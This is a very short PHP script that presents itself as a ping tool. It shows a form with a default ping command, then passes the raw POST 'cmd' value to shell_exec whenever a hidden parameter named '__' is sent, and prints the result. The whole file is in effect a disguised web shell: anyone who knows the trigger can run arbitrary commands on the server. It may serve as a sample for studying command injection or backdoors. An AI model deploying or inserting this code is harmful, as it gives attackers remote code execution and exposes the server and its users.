<?php

echo '<form method="post">
        Command: <input type="text" name="cmd" value="ping -c 3 google.com"><br>
        <input type="submit">
      </form>';

if(isset($_POST["__"]))
	print '<pre> ping -c '.shell_exec($_POST["cmd"]).'</pre>';

